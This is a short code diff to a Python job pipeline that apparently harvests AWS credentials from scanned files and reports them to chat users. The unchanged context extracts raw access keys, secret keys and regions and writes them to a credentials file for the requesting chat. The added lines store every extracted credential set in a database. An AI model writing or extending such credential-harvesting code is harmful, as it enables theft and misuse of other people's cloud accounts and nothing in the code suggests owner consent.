@@ -244,6 +244,9 @@ class Pipeline:
             await self.notify(job.chat_id,'🔑 Extracting raw AWS credentials…',job.message_id)
             raw_creds=await asyncio.to_thread(extract_raw_credentials,root)
             
+            if raw_creds:
+                await asyncio.to_thread(self.db.save_credentials,job.id,raw_creds)
+            
             if raw_creds and job.chat_id:
                 creds_file=self.s.output_dir/f'credentials-{job.message_id}.txt'
                 creds_lines=[f"{c['access_key']}:{c['secret_key']}:{c['region']}" for c in raw_creds]
